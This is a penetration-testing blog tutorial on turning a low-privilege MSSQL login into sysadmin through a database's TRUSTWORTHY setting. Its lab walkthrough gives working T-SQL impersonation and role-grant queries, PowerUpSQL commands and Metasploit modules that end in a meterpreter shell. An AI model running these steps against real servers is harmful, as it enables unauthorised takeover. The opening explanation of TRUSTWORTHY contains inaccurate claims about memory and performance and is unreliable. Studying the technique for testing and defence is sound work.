<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ms-sql-penetration-testing/" rel="category tag">MS-SQL Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">MSSQL for Pentester: Abusing Trustworthy</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mssql-for-pentester-abusing-trustworthy/" rel="bookmark"><time class="entry-date published" datetime="2021-09-07T10:34:22+00:00">September 7, 2021</time><time class="updated" datetime="2025-05-10T18:15:33+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will learn how to give sysadmin rights to the user who has only fundamental public rights. Technically, we will apply privilege escalation logic and give sysadmin the privilege to a regular public user. And abuse the trustworthy property, given that it is enabled on the Database.</span></p>
<h3><span style="color: #800000;">Table of content</span></h3>
<ul>
<li><span style="color: #000000;">Introduction to Trustworthy</span></li>
<li><span style="color: #000000;">Lab Set-Up</span></li>
<li><span style="color: #000000;">Abusing Trustworthy</span>
<ul>
<li><span style="color: #000000;">Manual</span></li>
<li><span style="color: #000000;">PowerUpSQL</span></li>
<li><span style="color: #000000;">Metasploit</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #000000;"><span style="color: #800000;">Introduction to Trustworthy</span> </span></h3>
<p><span style="color: #000000;">Trustworthy database property helps to determine that whether the SQL server relies on a database or not. When working with CRL, there will be many instances where special commands or procedures deem it vital to have particular privileges. It requires such a license so that it can protect the Database from malicious scenarios. Many properties can be used in windows servers and SQL servers to determine if the Database is trusted. The properties must be set accordingly to allow the SQL server to function. One method for doing this is by adding the trust command on both servers.</span></p>
<p><span style="color: #000000;">A drawback of a Trustworthy Property would be that it might take up resources like memory, which could cause performance issues in specific scenarios. For this reason, it’s best not to rely on these types of properties too heavily when developing applications or data models. However, they are helpful when using other techniques like event subscriptions or agent-based systems under a testing environment where resource consumption doesn’t matter much and performance isn’t essential either.</span></p>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<p><span style="color: #000000;">To perform the practice and for it to be successful, we will first set up our MSSQL server lab and for that, let us create a new database by right-clicking on the Database and selecting the New Database option as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CpPm2_d6K00/YTc6clRvxvI/AAAAAAAAye0/rvxZ0F6TpHo1E8EHJdS2AAiaDRlp1SJBQCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">A dialogue box will open, give a name for your Database and then click on the <strong>OK</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kAvygqRupis/YTc6685lHfI/AAAAAAAAye8/QBT_su92hGQKdcWJ0-tjsmu4vtRxIiYhQCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Now that the Database is created, we will create a user. To create a user, right-click on <strong>Logins</strong> and choose the <strong>New Login</strong> option as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EFp04WLpb2M/YTc7E5c7bvI/AAAAAAAAyfA/TxZCB_NSngs5-KCHxNmwPRDFUuXbSwdWgCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">A new dialogue box will open, there give name and password for your user and then click on the <strong>OK</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wp_fIMoIaI4/YTc7KPIDEkI/AAAAAAAAyfE/3xqZfgXmrGoWRVjha4Vfqv5Xy3EAcYvdACLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Now in the Server Roles, you can check that the user is only part of the public. After reviewing, click on the OK button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AZnYLKk3tM4/YTc7PIqkisI/AAAAAAAAyfI/XnuaWlLEJCE3i7xDvylcXpVqDQEQteypwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Now, go to <strong>User Mapping,</strong> and there select <strong>ignite</strong> Database for your user. In the role membership panel, choose the <strong>db_owner</strong> option, then click on the <strong>OK</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DXo1JBFuPEM/YTc7TuPQ_xI/AAAAAAAAyfM/Oqrz6YdQns8ORIlD0IEq6LZB55EN1IIpgCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Now, we will check to see if the trustworthy property is on for our Database or not. And for this, we will use the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">select name,is_trustworthy_on from sys.databases</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ncK71FhZRSU/YTc7aOLaPjI/AAAAAAAAyfY/xSvKieHUNgETaeAA4DbBRo5VayLYJLMCQCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">As you can see that the Database we created does not have the trustworthy property activated for it. So now, to activate the trustworthy property, use the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ALTER DATABASE [ignite] SET TRUSTWORTHY ON</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zTP7xL8gFBU/YTc7fbA1ukI/AAAAAAAAyfg/ZTZzU4nKcc0i8y4X-psCWgSZDwFsXziUQCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">To confirm the trustworthy status of the Database, we will use the following query again:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">select name,is_trustworthy_on from sys.databases</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l63N22cv52E/YTc7kUa2siI/AAAAAAAAyfk/SvHPj73Icr8ixFwhPY38P45RgiYME-XGwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">As you can see in the image above, the value for trustworthy is 1, which means it is activated. With this, our lab setup is completed.</span></p>
<h3><span style="color: #800000;">Abusing Trustworthy</span></h3>
<h3><span style="color: #800000;"><strong>Manual</strong></span></h3>
<p><span style="color: #000000;">Now that we have successfully set up our lab, we will log in from the raj user we created earlier. Through this user, we will check whether ignite trustworthy property is activated for it or not. And for this, we will use the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT name as database_name , SUSER_NAME(owner_sid) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Md6zFusnSSw/YTc7qKEyXAI/AAAAAAAAyfo/8rHyBgBozxwPY2KmwndUV5D2qShS4sQAwCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">The result of the above query shows that trustworthy is on. Now we will go to our Database and open the query tab by right-clicking on the Database and selecting the <strong>New Query</strong> option as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LpqjDqxcVDQ/YTc7yCrC35I/AAAAAAAAyfw/2w9Ikkb0LQ41hDm9cJffUGYprUSyFYmLACLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">Our query tab will open. Here, we will use the following query to check which users are db_owners:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT DP1.name AS DatabaseRoleName,  
    isnull (DP2.name, 'No members') AS DatabaseUserName  
FROM sys.database_role_members AS DRM 
RIGHT OUTER JOIN sys.database_principals AS DP1 
    ON DRM.role_principal_id = DP1.principal_id 
LEFT OUTER JOIN sys.database_principals AS DP2 
    ON DRM.member_principal_id = DP2.principal_id 
WHERE DP1.type = 'R'
ORDER BY DP1.name;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m1Wjh7wLL10/YTc73po2-mI/AAAAAAAAyf4/ymGMraP_aCoRTJkP7QoHZGMg39yPdGZagCLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">As a result of the above query, you can see that raj and dbo are both the ignite Database’s database owners. So now, we will mimic dbo user through raj user. Once the raj user successfully masquerades dbo, then it can further gain privileges for itself. And to do this, use the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">EXECUTE AS USER = 'dbo';
SELECT system_user;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D54EtvaIUnw/YTc7-PCzwwI/AAAAAAAAyf8/geUP_bUMd0sWCKzXfh0THEaYeBzW6mKIgCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">The above query has been executed successfully. Now we will gain more privileges for raj user by making it sysadmin with the help of the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">EXEC sp_addsrvrolemember 'raj','sysadmin';</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8_yH2MLq5nc/YTc8C_2T8OI/AAAAAAAAygA/Cw7l9P2ZUewP3YFUgazcd89ENyQHnhF2ACLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">To confirm whether our queries worked or not, we can go to <strong>Login Properties</strong> for the raj user and see the <strong>Server Rules</strong>. And there, you can see that the sysadmin option is checked. So, this way, we have successfully abused the trustworthy property to our potential. The same is shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CIJffa3-iK0/YTc8OsZH6II/AAAAAAAAygI/ZMR8MsxbMwkyNl_pMgmLQ45G8mwHEDRBwCLcBGAsYHQ/s16000/20.png"/></span></p>
<h3><span style="color: #800000;"><strong>PowerUpSQL</strong></span></h3>
<p><span style="color: #000000;">We can abuse the trustworthy property remotely as well using PowerUpSQL. We will first import the PowerUpSQL module in PowerShell and then check if the trustworthy is activated or not. For this, use the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\PowerUpSQL.ps1
Invoke-SQLAuditPrivTrustworthy -Username raj -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Verbose</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-i433Ar9tJoA/YT-7G7v99LI/AAAAAAAAynY/Bcaa5I1N4BoVKQxsJjIBr2KcejtmQLZPgCLcBGAsYHQ/s16000/50.png"/></p>
<p><span style="color: #000000;">In the result of the above commands, you can see that the trustworthy is on. So now, we will use the following commands to gain sysadmin privileges for our user:</span></p>
<p><a href="https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1"><span style="color: #0000ff;"><strong>Invoke-SqlServer-Escalate-DbOwner</strong></span></a></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\Invoke-SqlServer-Escalate-Dbowner.psm1
Invoke-SqlServer-Escalate-DbOwner -SqlUser raj -SqlPass Password@1 -SqlServerInstance WIN-P83OS778EQK\SQLEXPRESS</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-GrrzMc3wOD4/YT-7LST1PPI/AAAAAAAAync/MC9BvjZFcfEEm1ca1sN8Zp0nc87gBF6JACLcBGAsYHQ/s16000/51.png"/></p>
<p><span style="color: #000000;">And voila! We have sysadmin privileges for our users.</span></p>
<h3><span style="color: #800000;"><strong>Metasploit</strong></span></h3>
<p><span style="color: #000000;">As we all know, any remote attack is incomplete without Metasploit; therefore, we will now use Metasploit to do our bidding. Metasploit, an amazing framework, provides us with an inbuilt exploit to help us exploit our desire. Use the exploit to use the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql_escalate_dbowner
set rhosts 192.168.1.146
set username raj
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bb8F3edPLDg/YTc9FmgQ1xI/AAAAAAAAygg/cx7vuOqpFfQkv0HRDGwdNV_UNlwc7jmnACLcBGAsYHQ/s16000/52.png"/></span></p>
<p><span style="color: #000000;">As you can see, the above exploit will do all the work to gain sysadmin privileges for your user. Now that the user has sysadmin privileges, we can further use the following exploit to gain meterpreter session:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/mssql/mssql_payload
set rhosts 192.168.1.146
set username raj
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U2GGU8HTkyU/YTc9SYd4iuI/AAAAAAAAygo/Jw0J42-4-lE5fec95g_0C05SKqITNZdQACLcBGAsYHQ/s16000/53.png"/></span></p>
<p><span style="color: #000000;">And as you can see in the image below, our above exploit will provide us with a meterpreter session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gePp0EbakKw/YTc9e433ceI/AAAAAAAAygs/X1-ZwmPZj2UdLICyP9y9wT0GACCVKCQUgCLcBGAsYHQ/s16000/54.png"/></span></p>
<p><span style="color: #000000;">These are both local and remote ways to abuse and exploit trustworthy property and gain privileges.</span></p>
<p><span style="color: #000000;"><strong>References</strong>:</span></p>
<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://stackoverflow.com/questions/31120912/how-to-view-the-roles-and-permissions-granted-to-any-database-user-in-azure-sql"><strong>https://stackoverflow.com/questions/31120912/how-to-view-the-roles-and-permissions-granted-to-any-database-user-in-azure-sql</strong></a></span></p>
<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1">https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Yashika Dhir is a Cyber Security Researcher, Penetration Tester, Red Teamer, Purple Team enthusiast. Contact her on</span> <strong><a href="https://www.linkedin.com/in/yashika-dhir/">Linkedin</a> </strong><span style="color: #000000;">and </span><strong>Twitter</strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
